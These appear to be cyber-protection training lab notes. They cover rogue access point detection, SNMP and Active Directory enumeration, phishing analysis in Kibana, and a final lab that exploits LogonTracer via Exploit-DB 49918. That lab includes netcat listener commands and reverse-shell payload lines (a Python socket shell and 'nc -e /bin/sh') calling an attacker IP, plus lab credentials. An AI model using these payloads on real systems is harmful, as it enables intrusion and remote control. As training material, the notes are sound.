4. Observe the BSSID field in the management packets transmitted on this network. Observe any discrepancies in the BSSID field compared to the list above.

filtered out all known good bssid to find the unknown / bad bssid

![image](https://github.com/user-attachments/assets/6f8db29a-225c-4e19-bb63-7a8f1700f8bb)

![image](https://github.com/user-attachments/assets/fe6789f4-4615-4204-b4a8-de1d677e2053)


---------------------------------------------------------------------------------

Practical Defenses | Detecting Rogue Access Points

Workflow


NOTE: The following steps continue from the previous task.


5. Observe that the device with BSSID 00:0f:66:05:a9:11 is transmitting wireless management packets with the same SSID PublicLibrary as the legitimate access point. 

![image](https://github.com/user-attachments/assets/742b365b-31c2-420c-b179-5c0ae22c384f)



This device is successfully emulating the legitimate PublicLibrary access point. Any device that connects to this rogue access point — even though they may experience uninterrupted service — are likely to have their entire communication captured by the attacker.


![image](https://github.com/user-attachments/assets/ac1e82c5-ab6f-4160-9f0e-3b05007da62e)


![image](https://github.com/user-attachments/assets/0fa7dd1f-1534-459b-9eba-a19cfad85af4)

---------------------------------------------------------------------

Practical Defenses | Detecting Rogue Access Points
Workflow

﻿

NOTE: The following steps continue from the previous task.

﻿

6. Observe that the legitimate access point is operating on channel 11, which is identified in the 802.11 radio information header.


![image](https://github.com/user-attachments/assets/bae3d8cf-b4d4-48ba-ab4f-9eb4a3b27477)

7. Open deauth_capture.pcap from the desktop.

![image](https://github.com/user-attachments/assets/264d50db-5d77-4f43-b4a9-dbe47ace7689)

8. Enter the following Wireshark filter to locate all the 802.11 frames of type 12 — deauthentication frame:
wlan.fc.type_subtype == 12

![image](https://github.com/user-attachments/assets/1fd24c8a-0c14-4585-b64d-1fc2f9bd20af)


![image](https://github.com/user-attachments/assets/0fa37f9a-e866-42dd-8e64-7abb6b600e86)

![image](https://github.com/user-attachments/assets/6a02fde5-c0fa-43a7-8909-5afea01ea7d8)

----------------------------

########## M6 L4 ############
######### SNMP Enumeration ###########


snmpwalk


An SNMP application that uses SNMP GetNextRequest to query a network entity for a tree of management information. snmpwalk is distributed under various open-source licenses as part of the Net-SNMP suite of tools.


snmp-check


Similar to snmpwalk. It is used to automate the process of enumerating SNMP devices to gather information and output the resulting data in a more human-friendly manner than snmpwalk. snmp-check is distributed under the Gnu Public License (GPL) from Nothink! as a part of the Kali Linux toolkit.

---------------------------------------------------

SNMP Enumeration | Techniques
There are many tools that network and system administrators use to interact with agents/devices. Attackers often use the same tools as a mechanism to blend in with legitimate activity. Both open-source and commercial network monitoring suites exist with varying levels of automation and ease of use. Both snmpwalk and snmp-check are common Linux command-line utilities that use SNMP GETNEXT requests to query an agent for a tree of MIB values. snmpwalk can request only a portion of the MIB by specifying an OID space to start using GETNEXT requests — essentially a sub-tree. In the following lab, trainees use two CLIs to review examples of the data that networking devices may expose through SNMP.

﻿

Workflow

﻿

1. Log in to the kali-hunt Virtual Machine (VM) using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Terminal.

﻿

3. Run the command below to perform an SNMP enumeration against the 172.35.1.37 networking device:

$ snmp-check -c simspace 172.35.1.37 | less
﻿

Figure 6.4-5 shows the output of this command. The exact output differs when run as the output depends on the system's state at the time the information is queried.

﻿
![image](https://github.com/user-attachments/assets/3fe0a929-ef93-4d1e-8292-757ec9329093)

![image](https://github.com/user-attachments/assets/fb300d17-dad1-4dc9-b2ab-c111927c0091)


![image](https://github.com/user-attachments/assets/fea0acf7-97e3-4cec-82d7-c2e88a139229)

![image](https://github.com/user-attachments/assets/4297b99d-0482-4cff-93d8-cd52856240cf)

--------------------------------------

SNMP Analysis in Kibana
Analyzing SNMP activity in a network can be accomplished using a Security Information and Event Management (SIEM) like Security Onion using Kibana. In this scenario, the Cyber Protection Team (CPT) has been tasked to assist local defenders of the City Hall network. Threat intelligence indicates attackers may be using SNMP to gain detailed network configuration details in order to gain access and laterally move within similar city networks. City Hall administrators requested assistance due to the discovery of a router configuration posted on GitHub that contained the device's SNMP community string by accident and was publicly accessible. Local defenders have provided the following overview:

IP address space: 172.35.0.0/16

Public IP address: 104.53.222.32

Edge firewall: 156.74.85.2

Demilitarized Zone (DMZ): 172.35.3.0/24 (Network Address Translation [NAT] from ch-edge-rtr to public IP address)

SNMP: simspace community string, but not used by City Hall network administrators

A Deployable Mobile Support System (DMSS) kit has been attached to the City Hall core router using the 199.63.64.0/24 subnet

Take note of the above information and use it to analyze any SNMP activity in the following tasks.

﻿

Workflow

﻿

1. Log in to the kali-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Firefox and navigate to the Discover - Elastic bookmark — or https://199.63.64.92/kibana/app/discover#/ — and log on using the following credentials to open the Kibana Discover dashboard:

﻿

NOTE: The training Security Onion server uses a self-signed certificate in this training environment.

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

3. Change the date/time picker for the absolute timeframe Oct 25, 2021 @ 00:00:00.00 → Oct 25, 2021 @ 15:00:00.00 and execute the following filter in the Search box to filter for SNMP events:

event.dataset.keyword: snmp
﻿

4. In the Search field names box on the left, search for, and add the following fields using the plus sign:

source.ip

destination.ip

snmp.version

snmp.community

snmp.get.requests

snmp.get.responses

snmp.get.bulk_requests

snmp.set.requests

![image](https://github.com/user-attachments/assets/3b3ea905-b78c-4c55-af81-46c3e0775e23)

The results look similar to Figure 6.4-7. Notice three versions of SNMP were captured — SNMPv1, SNMPv2c, and SNMPv3. This can be confirmed by selecting the snmp.version field in the left panel.

![image](https://github.com/user-attachments/assets/e08f84ed-d904-4555-bd88-b1499cc50116)

6. Perform a similar analysis on the destination.ip field and answer the question in the next task.


![image](https://github.com/user-attachments/assets/2a8462a4-cb6d-4769-b20d-fa64c37ab01e)

![image](https://github.com/user-attachments/assets/729562df-423e-47df-bfd6-89355bc110c1)

----------------------------------------------------------------

Analyzing the Results
﻿
![image](https://github.com/user-attachments/assets/1e021973-2894-4f1e-ac79-35869044b8c5)

As is seen in Figure 6.4-9, at least five IP addresses were seen receiving SNMP requests. In order to see the full list, use a visualization to see the full list.


Use the information from the scenario to identify SNMP activity that is suspicious.


![image](https://github.com/user-attachments/assets/326b05fb-03cb-499c-aeb0-e8c9ca66cd21)

![image](https://github.com/user-attachments/assets/0af9fd86-2c22-44c6-944f-56629fa74031)

-----------------------------------------------------

Workflow


1. Add a filter to exclude the source IP address 199.63.64.51. One method is to hover over the relevant IP address and select the minus sign.

![image](https://github.com/user-attachments/assets/938f8d1d-ab62-4644-a9e7-c36d349820a1)


Notice the event around 08:50 and the large gap until approximately 13:40 in Figure 6.4-11.


2. Select the event around 08:50 and analyze the results.


![image](https://github.com/user-attachments/assets/1d3a7cdb-bd18-4ed7-87ea-0c52b2cf3d90)

Notice the large number of responses — 4,382 OIDs were requested and the same number of responses. Recall from the earlier exercise how much data was returned from an snmpwalk enumeration and how long that quantity of data takes to analyze. The large time gap suggests an attacker performed a single successful SNMP enumeration of the 156.74.85.2 device and an analysis to plan additional hosts to target. Additional time gaps suggest similar actions with a shorter time for analysis needed since some information about the network had already been revealed. This analysis and planning is often seen in the attacker lifecycle as part of the discovery of externally accessible hosts, and then using that information to dig deeper into the network to identify and discover additional devices that may be vulnerable to attacks or abuse through their configurations. From one external enumeration, it appears enough information was revealed that the attacker was able to discover additional networking devices and gain even more configuration data. Since the same community string was used on more devices than the initially leaked configuration file, an attacker can use SNMP to map out a network to gain additional situational awareness. The vast majority of valid SNMP traffic only occurs between known hosts. SNMP traffic that communicates outside of the organization's network and internal SNMP traffic to non-management hosts is suspicious and should be investigated immediately.

----------------------------------------------

SNMP Mitigation
SNMP agents are not installed or started by default on most Windows Operating Systems (OS). For Windows OSs, SNMP runs as a service and can be seen in the Services control panel. Disabling the SNMP service is one method to mitigate risk due to SNMP. Changing the community strings and restricting what hosts can reach the SNMP service are other ways to mitigate SNMP on Windows OSs. Routers and other networking devices are all different, but references to SNMP in the configuration files indicate if the agents are running. Mitigating these devices varies and the documentation should be consulted in order to ensure the appropriate configuration changes are made. The following workflow walks through the mitigation of SNMP on a Windows server.


Workflow


1. Log in to the ch-dc1 VM using the following credentials:
Username: trainee
Password: CyberTraining1!



2. Open the Services control panel and scroll down to SNMP Service.

![image](https://github.com/user-attachments/assets/f48b5acd-6c7c-4e1b-895d-5cc756a62acf)

In this case, the SNMP Service — the agent — is installed and running. The management service that would receive SNMP traps — SNMP Trap — is not running.


3. Open the SNMP Service properties, and select the Security tab:

![image](https://github.com/user-attachments/assets/bfeee055-58c0-4ec6-88b0-5d9bcfea031f)

Notice the simspace community string is listed with read-only rights, and this system is configured to Accept SNMP packets from any host. Limiting SNMP to management IP addresses only is one way to mitigate risk, as well as ensuring there are no write SNMP community strings. Configuring the SNMP agent to send Traps is made on the Traps tab. Microsoft has deprecated the use of SNMP in Windows OSs, so there is no native support for SNMPv3 with authentication. The use of Windows Management Instrumentation (WMI) or Windows Remote Management (WinRM) tools are the preferred and supported methods for obtaining the configuration and performance data of other systems using SNMP.


4. Select the General tab, stop the service, and set the Startup type to be Disabled.

![image](https://github.com/user-attachments/assets/a44b8d3d-6c68-4f4b-80d7-a4798192d9ab)

5. Apply the changes, and select OK. 


The same steps can be used to disable the SNMP Trap service. While there is less risk from leaving the SNMP Trap service enabled, if it is not being used, the best practice is to remove or disable any services not intended to be used to reduce the potential attack surface. Group Policy Objects (GPO) can also be created to ensure the SNMP service is disabled or removed across Windows domains.


![image](https://github.com/user-attachments/assets/e009b015-bd88-42b2-8b2e-7855744dde19)

![image](https://github.com/user-attachments/assets/d95ba8de-166d-481d-92a2-543660b08b62)

---------------------------------------------------

########## M6 L5 ############
######### Active Directory Enumeration ###########

AD Enumeration with NET.exe
The CPT has been assigned to a mission to audit an AD environment. A domain account has been provided to the CPT to assist local defenders. Enumerate the AD environment and identify misconfigurations that an adversary may be able to take advantage of.

﻿

Workflow﻿﻿

﻿

1. Log in to the ch-tech-1 Virtual Machine (VM) using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a command prompt.

﻿

3. Run the following command to check password login restrictions for the domain:

C:\Users\trainee>net accounts /domain

![image](https://github.com/user-attachments/assets/d357dcb4-a5b8-4e05-ad52-a1c59a9f36df)


4. The CPT was provided a network map and knows the DC is ch-dc1. Run the following command to see if any shares are accessible:
C:\Users\trainee>net view \\ch-dc1

![image](https://github.com/user-attachments/assets/e4054735-5929-4004-ad3e-a072932b09fa)

5. An open bkup share — which is likely used for backups — is on the DC. Connect and see what information this could provide an adversary.
C:\Users\trainee>net use x: \\ch-dc1\bkup

![image](https://github.com/user-attachments/assets/a630dc16-c10e-46fc-9768-41611eef7859)

6. List what is in the share.
C:\Users\trainee>dir \\ch-dc1\bkup

![image](https://github.com/user-attachments/assets/a4039de0-e3dc-47b9-846c-ad5378819bbf)

7. Open the user-list.txt file in Notepad.
C:\Users\trainee>\\ch-dc1\bkup\user-list.txt

![image](https://github.com/user-attachments/assets/b63ac9c2-1be3-4d48-b48f-864a74def614)


8. Check whether any of these users are in the Domain Admins group.
C:\Users\trainee>net group "Domain Admins" /domain

![image](https://github.com/user-attachments/assets/13cdee24-ac34-4397-873b-7027661bcb8f)


9. As indicated in Figure 6.5-6, the users did not show up in the Domain Admins group. Check the user details to see which groups they are in.
C:\Users\trainee>net user helpdesk /domain

C:\Users\trainee>net user lewis /domain

![image](https://github.com/user-attachments/assets/8207472e-a400-4fe0-afbe-5400ab531835)

![image](https://github.com/user-attachments/assets/42083665-dac4-4cae-a1ec-fa9551d05419)

This audit was a success. A share was found that contained sensitive information an adversary could have used to advance access. It was also found that enumeration of user account details was successful using a non-admin domain user and without an elevated command prompt.

![image](https://github.com/user-attachments/assets/a9523661-e6c5-4488-b299-13e814c1bf66)


----------------------------------------------------

Enumeration with PowerSploit (PowerView)
This lab demonstrates use of PowerSploit to find information on shares, users, and groups.

﻿

The CPT has been assigned to a mission to audit an AD environment.  Access to a technician's desktop has been provided to allow the team to perform AD enumeration in an attempt to find misconfigurations before an adversary does.

﻿

Workflow

﻿

1. Log in to the ch-tech-1 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open PowerShell.

﻿

3. Search the domain for shares.

PS C:\Users\trainee> Find-DomainShare
﻿

This command can require significant time to finish because it enumerates all the machines that have entries in AD.

﻿

NOTE: The order in which the systems are enumerated may differ from the screenshot.

﻿![image](https://github.com/user-attachments/assets/78d9a922-e5fa-4b78-85d7-386926e62c23)

PowerSploit/PowerView can use find cmdlets like Find-DomainShare to do the hard work of stringing commands together to complete a complex task. Find-DomainShare uses multiple commands to look for systems and check them for shares.


The search can be refined to return only shares to which the current account has read access and that exist in the vcch.lan domain.
PS C:\Users\trainee> Find-DomainShare -ComputerDomain vcch.lan -CheckShareAccess



The bkup share has been found on the ch-dc1 system, as it was in the NET.exe lab. Because this is the same share that was detected in the NET.exe lab, the contents of the user-list.txt file is provided below to save time.
helpdesk:p@ssw0rd
lewis:password!



4. Check the Domain Admins group to see if these users are members.
PS C:\Users\trainee> Get-NetGroup 'Domain Admins'


![image](https://github.com/user-attachments/assets/5cda04c9-f605-441f-8dfe-fde1da634908)

To check who is in the group, review the member list in the command output.


5. Look up more information on the users from the .txt file.
PS C:\Users\trainee> Get-NetUser helpdesk, lewis

![image](https://github.com/user-attachments/assets/1173098f-13cb-40ad-bcf6-2c4151c06335)

![image](https://github.com/user-attachments/assets/7142685a-8bc8-45b1-a7c8-4cf6c60cebc2)

This audit provided an example of how much more efficient third-party tools can be over built-in system tools. Specifically, PowerView's find commands automate much of the manual work an a  dversary would otherwise have to do.

![image](https://github.com/user-attachments/assets/7ae1b2c8-0ed4-4e92-84af-b34f71e1e050)

![image](https://github.com/user-attachments/assets/b4a21aad-16a9-49b8-aba4-f7f7afc027e9)

![image](https://github.com/user-attachments/assets/37157047-90a3-483b-9594-77b7be702faa)

-----------------------------------------------

Detecting BloodHound/SharpHound Usage
This lab uses Sysmon event ID 3 to detect SharpHound's initiation on a system.

﻿

The CPT has been assigned to a mission to hunt for AD enumeration. The team has received intel that an adversary known to target city government networks has used BloodHound/SharpHound in the past, so that will be the focus of the hunt. The time range used is Oct 27, 2021 @ 14:30:00.000 → Oct 27, 2021 @ 15:30:00.000.

﻿

Workflow

﻿

1. Log in to the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Chrome.

﻿

3. Select the Discover - Elastic bookmark.

﻿

4. Log in to Security Onion using the following credentials (if needed):

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Add the following fields to the search, and set the time range to align with this hunt as Oct 27, 2021 @ 14:30:00.000 → Oct 27, 2021 @ 15:30:00.000.

host.name

user.name

event.code

event.action

source.ip

source.port

destination.ip

destination.port

process.executable

process.name

﻿![image](https://github.com/user-attachments/assets/9144f14e-1df6-4252-96e7-18ab809c681b)

6. Create a query to show only Sysmon event ID 3 network connection logs.
event.code: 3

![image](https://github.com/user-attachments/assets/56e7fee4-0a31-43ac-acf3-d7e246d0feef)

7. Narrow the search to look for logs where the destination port is 389 or 636 or 445.
event.code: "3" AND destination.port: ("389" OR "636" OR "445")



Check the process.name field to see the top process names in the results.


![image](https://github.com/user-attachments/assets/3353b054-afbe-4f44-be05-616783b46bb6)


SharpHound.exe constitutes 19% of the results.


8. Select the plus sign next to "19%" to see more information.

![image](https://github.com/user-attachments/assets/73bb3384-4e67-4020-b121-a08bd67d6254)


![image](https://github.com/user-attachments/assets/a6af7ed3-8193-42e7-8c76-e03d41691ba0)

There are 19 SharpHound logs, some with a destination port of 389 and some with a destination port of 445, as expected. Notice that process.executable provides the path where SharpHound was run on the system.


This activity on ch-tech-1 should be reported right away.


![image](https://github.com/user-attachments/assets/e3291d41-cdbc-4ef4-abda-045f43455508)



---------------------------------------------------------------

##########  L1 ############
######### Social Engineering ###########

Phishing Review | Identifying Phishing Messages
Understanding what constitutes phishing messages is important, but identifying them in practice and training others to do so is even more important. Use the knowledge gained in this lesson to identify phishing messages in a mission partner user's inbox. 

﻿

Workflow

﻿

1. Log in to the ch-edu-1 Virtual Machine (VM) as Karen Smith using the following credentials:

Username: ksmith
Password: CyberTraining1!
﻿

2. Open Karen Smith's Chrome browser, and select the Outlook Web App bookmark to observe the message that she reported.

﻿

NOTE: The Outlook Exchange server uses a self-signed certificate in this training environment, so the certificate exception must be acknowledged to proceed to the mailbox.

﻿![image](https://github.com/user-attachments/assets/f6268961-08fb-4d43-b28c-c87cc2088dba)

3. Use the same credentials to log in to the Outlook Web App:
Username: vcch\ksmith
Password: CyberTraining1!

![image](https://github.com/user-attachments/assets/eda172b0-8619-4db6-ba65-2867ff551bcb)

4. Open the email with the subject Peterson, Jack N shared "TP20-DS6308 (UNCLASSIFIED)" with you:

![image](https://github.com/user-attachments/assets/dc7bd642-01bc-4b64-8f1d-9d4cf8e5a932)

5. Observe the following attributes that identify this message as a phishing email:

![image](https://github.com/user-attachments/assets/5dc6f453-a83c-48b8-9741-2ec27a57561a)

This sender's address purports to be from the US Department of State, but without any cryptographic signature. The sender opens the email with a generic greeting that does not identify Karen by name. They proceed to include a spelling error and a link that is suspicious because the domain of the link is not an official government domain. For all these reasons, Karen was correct to flag the message as suspicious, and responders should analyze it and remove it.


6. Examine the other messages in her inbox one at a time, and then answer the following question.

![image](https://github.com/user-attachments/assets/f3a4da58-9633-483d-9a89-9aae36dd78e3)

----------------------------------------------------------------

Responding to Phishing Campaigns | Common Attributes
In addition to a suspicious message from the State Department, Karen also had an email supposedly reporting a security concern from Facebook. Other users in the mission partner organization have reported similar messages in their inboxes, so this is likely part of a larger phishing effort targeting this organization. Once a message is identified as likely part of a phishing campaign, it is essential to develop Indicators of Compromise (IOC) to identify other messages that may be circulating around the organization.

﻿

Workflow

﻿

NOTE: The following steps continue from the previous task.

﻿

7. The first step is to categorize the metadata of the message.

﻿

What was the subject line?

﻿

In this case, it was Suspicious Login, which is designed to create a pretext of fear — ironically — that one's account is being attacked. It is important to determine if there are any variations on this subject line in other messages.

﻿![image](https://github.com/user-attachments/assets/a76202db-a00a-4e4e-aed7-7790cd285458)

8. Determine if the email contained any suspicious attachments or links.


In this case, there were no suspicious attachments, but the included hyperlink is not from the Facebook domain. 


In fact, this hyperlink domain was shown in the attached Volexity threat report to be associated with the Advanced Persistent Threat (APT) actor APT 29 — Dukes.

![image](https://github.com/user-attachments/assets/12993d2b-25fa-4c64-9c2a-cf52793f11eb)

If the message did contain an attachment, the next step would be to determine the file type, extension, hash, and any naming conventions, if different versions of the file were being distributed. 


9. Determine the true source of the message.


a. Select View Message Details.


This opens the email header information that is stored by the exchange server when it receives a new message:

![image](https://github.com/user-attachments/assets/2a03daf6-3e51-4f6f-bb97-fd21508c8639)

b. Observe the message metadata and the source address listed:

![image](https://github.com/user-attachments/assets/66dac4ea-5630-4178-ab0c-d705b904cd49)

This particular source was using the Simple Mail Transfer Protocol (SMTP) server as an open relay to masquerade as a legitimate address, which is a common technique used by threat adversaries during phishing attacks. The intelligence support cell of the Cyber Protection Team confirms that the IP address listed in the email header does not match the official Facebook domain and the SMTP server that the message was routed through has an open port facing the internet, which is a common attribute of open relay servers used for this sort of spoofing. 


At this point, if the message was not sent through an SMTP relay, consider Open-Source Intelligence (OSINT) tools to determine if the source IP address or domain used a known malicious mail proxy. 


If there is any unique data in the other message header fields — such as X-Authenticated-User or X-Sender-Id — take note to determine any other source information.


10. Having obtained the necessary details about this campaign that could lead to identifying other messages like it, proceed to an analysis system to query the rest of the network. 



----------------------------------------------------

Responding to Phishing Campaigns | Practical Analysis

Having identified socially engineered phishing messages and gathering several important IOCs regarding the phishing campaign that this is a part of, use a Security Information and Event Management (SIEM) system to locate Zeek logs of the suspicious email traffic. This skill is useful in identifying similar messages propagating through the organization.

Workflow


1. Log in to the win-hunt VM using the following credentials:
Username: trainee
Password: CyberTraining1!



2. Log in to Security Onion through the Chrome browser bookmark Discover - Elastic.


This service is located at address https://199.63.64.92/kibana/app/discover#/.
Username: trainee@jdmss.lan
Password: CyberTraining1!



NOTE: The Security Onion server uses a self-signed certificate in this training environment, so the certificate exception must be acknowledged to proceed to the website.


![image](https://github.com/user-attachments/assets/8156849f-8335-430b-a641-6be6a067b396)



This opens the Discover dashboard. Since Kibana uses a default query for events in the most recent 24 hours, the details in Figure 7.1-15 differ from the lab environment.

![image](https://github.com/user-attachments/assets/e6bfb8dc-2031-4da3-90da-5ed8f3c07fa4)

3. Set the dates to 28 October 2021 from 12:00 – 23:30, since this is the time found in Karen Smith's mail receipt.


![image](https://github.com/user-attachments/assets/bdb85516-b42c-43ae-b6fa-419b21b5957f)


4. Use the IOCs identified earlier as filters to identify the message that was just discovered.


This Kibana query helps identify the message:
source.ip:128.0.7.205 AND smtp.recipient_to.keyword: ksmith@vcch.gov


![image](https://github.com/user-attachments/assets/f05efe97-fa33-47e8-ba1a-87ffda218683)

The message was found in Security Onion's Zeek logs from the external interface monitored by one of the forward nodes. That node captured the communication between the threat actor IP address and the SMTP server, and the message traffic included these email details, which allowed the analyst to identify this message and any others like it. This hunt is performed shortly, but it is important to fully educate users about their sensitive data and the danger of these messages so that no compromise occurs before they can be fully cleaned out of the network. 


-------------------------------------------


Knowledge Check
In addition to Karen Smith, several other recipients in the mission partner organization received messages during this phishing campaign that targeted Facebook users. Using the IOCs developed earlier, determine which other users were targeted.

﻿

Recall that the helpful filters are:

source.ip:1.2.3.4 
smtp.recipient_to.keyword:*string*
smtp.mail_from.keyword:*string*
smtp.subject:*string*
﻿

And recall that several of the identified IOCs include:

Subject: Suspicious Login
Source address: security@facebook.com
Suspicious link domain:  r20.rs6.net ﻿
Question:
﻿
Which other accounts received emails like that of Karen Smith?
﻿

(Select all that apply)


![image](https://github.com/user-attachments/assets/4c386873-1273-41c0-8e69-44adc09366f7)


-----------------------------------------------------------

##########  L2 ############
######### Finding and Using an Exploit ###########


Workflow


1. Log in to the kali-hunt Virtual Machine (VM) using the provided credentials:
Username: trainee
Password: CyberTraining1!



2. Open a terminal.


Recall that to get a list of running services, a port scan is conducted, which usually includes service versioning.


3. Run the following command to conduct a port scan as well as gather more information about the service version and potential Operating System (OS) version against the first host while skipping host discovery. Using sudo prompts for a password, which is CyberTraining1!.
(trainee@dmss-kali)-[~] $ sudo nmap -sS -sV -Pn -O 200.200.200.10



![image](https://github.com/user-attachments/assets/c6f693ae-bac4-4f58-8509-dc403d0642bf)



Figure 7.2-1


Sometimes, Nmap prints more output from Transmission Control Protocol (TCP)/Internet Protocol (IP) stack fingerprinting from OS detection. The determination for the OS is still the same. 


Based on the scan results, a possible Ubuntu OS with Secure Shell (SSH) and Hypertext Transfer Protocol (HTTP) is open. The SSH version is OpenSSH 8.2p1 and the HTTP server is Werkzeug HTTP Daemon (HTTPD) with a version of 0.14.1. SSH is running on the standard port, and HTTP is running on alternate port 8080 versus port 80.


Note that while the results of the OS detection were inconclusive (only returning Linux rather than the specific distribution), the service versioning returned more specific information regarding the OS. This is because Nmap uses different probes while performing service versioning and OS detection.


If there are no operational security concerns related to security products in the network, then more information is better — which is why -sV (probe for service/version info) and -O (OS detection) were both used despite returning different data.


Exploits may or may not be OS — and service version — specific, so gathering as much information as possible is important.


Since there is a web server running on the 200.200.200.10 host, gather additional information about what may be hosted on the server by visiting the webpage. There is a variety of web applications that have further vulnerabilities on top of the underlying web server software. For example, website content managers such as WordPress and Drupal have introduced several vulnerabilities that enabled attackers to conduct arbitrary remote code execution.


4. Open Firefox and visit the following webpage:
http://200.200.200.10:8080



The web application that has been imported into the range relies on resources on the internet that are not accessible in the range. This is why the page does not render properly in the environment.


![image](https://github.com/user-attachments/assets/7fe91cb0-a02a-4aaf-a27b-e75cca3cf8a0)

The application running on the webserver is something called LogonTracer. However, no software version is available.


At this point in time, the following leads for software to search for an exploit are available:
OpenSSH 8.2
Wekzeug HTTPD 0.14.1
LogonTracer unknown software version

This is enough information to begin searching Exploit-DB for exploits. Kali Linux has a CLI that allows users to search exploits in Exploit-DB. A local copy of Exploit-DB is maintained, so for the newest exploits, the database may require an update. This can be accomplished by running the following command:
searchsploit -u



NOTE: Internet connectivity is needed for this to work, so this is not performed in this lab.


5. View the help menu for SearchSploit to get a general usage idea of the utility by running the following command:
(trainee@dmss-kali)-[~] $ searchsploit -h

![image](https://github.com/user-attachments/assets/d5a95c18-c249-425e-8252-fd7774e7ea00)


The syntax is simple and reasonably straightforward. For the searches in the following steps, do not use any switches.


6. Run the following command to search for exploits related to OpenSSH:
(trainee@dmss-kali)-[~] $ searchsploit openssh


![image](https://github.com/user-attachments/assets/668293fe-a74f-49a1-af9d-8cb28e535fcb)


There does not seem to be a viable OpenSSH exploit for the current software version — 8.2. For reference, knowing what to look for depends on what is being attempted. To gain access to the system, look for something that enables command execution, whereas to ensure that a host had a failover system in place, then look for a Denial of Service (DoS). To see if the systems can be remotely accessed and execute the desired commands, good exploit candidates would have the following attributes:
Matching software
Matching software version
Matching OS (if applicable)
If the exploit must be done over the network, then remote somewhere in the exploit title or path
May allude to Code Execution or Command Execution
May allude to being Unauthenticated, as there are no credentials to use.

7. Run the following command to search for exploits related to Wekzeug HTTPD:
(trainee@dmss-kali)-[~] $ searchsploit wekzeug

![image](https://github.com/user-attachments/assets/8e0de26c-5746-4de3-9ae1-670f6932dcaf)


Once again, there are no viable results.


8. Run the following command to search for exploits related to LogonTracer:
(trainee@dmss-kali)-[~] $ searchsploit logontracer

![image](https://github.com/user-attachments/assets/a4b920a2-0ea7-4f00-a449-81e796e0a68d)


There is an exploit present for the software, though unfortunately, the version is unknown. This is a good time to read the exploit to see if it can be used. Notice the partial path provided — multiple/webapps/49918.py. The filename — 49918.py — is also the exploit ID. Make note of the exploit ID for the next step. 


9. Run the following command to find the full path of the exploit. -p specifies the full path given an exploit ID and copies it to the clipboard, if possible.
(trainee@dmss-kali)-[~] $ searchsploit -p 49918


![image](https://github.com/user-attachments/assets/3652d1b2-739e-4e79-9d65-899e5b4f66c1)

The full file path — as shown from the results of the command — is /usr/share/exploitdb/exploits/multiple/webapps/49918.py. CDAs should always look at the exploit before using it for a few reasons such as:
Finding usage instructions
Finding out more information about what the exploit is actually doing
Making modifications to the exploit script
Ensuring that there is no malicious code in the exploit

10. Run the following command to read the exploit script:
(trainee@dmss-kali)-[~] $ less -N /usr/share/exploitdb/exploits/multiple/webapps/49918.py

![image](https://github.com/user-attachments/assets/f710fb11-82dd-4fca-8b01-60ccc46af464)



From lines 13–16, the user needs to provide the attacker's IP address, attacker's port, and the Uniform Resource Locator (URL) to the victim.


From lines 22–29, it is evident that it is a command injection vulnerability that is being exploited, which sends back a shell to an attacker's listener.


Keep in mind, it is not necessary to understand everything that is happening in the script, just a general idea of what it is doing. There is no need for an in-depth code review.


11. Run the following command to print the exploit script's help menu:
(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py -h

![image](https://github.com/user-attachments/assets/8cc2b5ab-ff38-4f2d-8ec4-3195e48b6226)

Now the syntax of the command is known.


12.  Start a listener before running the exploit, as the exploited host needs something to call back to. The port is somewhat arbitrary. In this case, 4444 is used.
(trainee@dmss-kali)-[~] $ nc -nlvp 4444

![image](https://github.com/user-attachments/assets/cb7ea7ab-c207-40b7-b626-e56228fe5ce5)

13. Open a new tab or window, and run the following command to run the exploit:
(trainee@dmss-kali)-[~] $ python3 /usr/share/exploitdb/exploits/multiple/webapps/49918.py 199.63.64.51 4444 http://200.200.200.10:8080

![image](https://github.com/user-attachments/assets/bd3fb75e-a2e4-4f38-a07b-51fb7266d17d)

The output states If the terminal hangs, you might have a shell. Since the terminal hangs immediately after sending the exploit, this is a good sign.


14. Switch back to the other terminal where Netcat was running.


![image](https://github.com/user-attachments/assets/2bafe7e5-f60a-4ac4-b3bd-656e4632b5d5)


A shell was received from the exploited host. Notice that a few seemingly random characters are returned in the prompt as well. These are escape codes, which are responsible for formatting text that is typically seen when entering text into a terminal and do not affect running commands.


15. Run a command to check the functionality of the shell.
(trainee@dmss-kali)-[~] $ /usr/local/src/LogonTracer # whoami

![image](https://github.com/user-attachments/assets/72022864-43ac-47cf-8d56-69a69f57288f)

The shell appears to be in working order, and notice you are the root user on the victim host.


16. Enter exit to exit the shell.

----------------------------------------

Making Modifications to a Script to Suit the Target Environment
The exploit script was examined in step 9, and no modifications were needed.

﻿

Workflow

﻿

NOTE: The following steps continue from the previous steps.

﻿

17. View the exploit script again by running the following command:

(trainee@dmss-kali)-[~] $ less -N /usr/share/exploitdb/exploits/multiple/webapps/49918.py
﻿

Focus attention to line 22:

![image](https://github.com/user-attachments/assets/eb9d4b9d-5378-40db-9afc-f949a5cb8759)




A Python command is injected, which creates a socket to the provided IP address and port. A shell is then attached to it. This may be problematic in different environments due to the fact that Python is not installed on many hosts. The payload may end up doing nothing in those circumstances — it is not an issue in this case as LogonTracer is actually written in Python. With different exploits, the script may need to be edited to work properly.


18. Make a copy of the script before making modifications:
(trainee@dmss-kali)-[~] $ cp /usr/share/exploitdb/exploits/multiple/webapps/49918.py .



19. Open the copy of the exploit script in the Vim editor:
(trainee@dmss-kali)-[~] $ vim 49918.py



20. Enter i to start the edit mode, then change the contents of the 22nd line beginning with PAYLOAD from:
PAYLOAD = f"python -c 'import pty,socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{ATTACKER_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"



to:
PAYLOAD = f"/usr/bin/nc {ATTACKER_IP} {ATTACKER_PORT} -e /bin/sh"

![image](https://github.com/user-attachments/assets/1a15b470-ca92-493d-8739-d5aeb8bb87b6)


Since Netcat comes installed by default on many distributions more frequently than Python, this may increase the chances of an exploit working. The Python command was replaced with a Netcat command which executes /bin/sh and sends it to the attacker's listener.


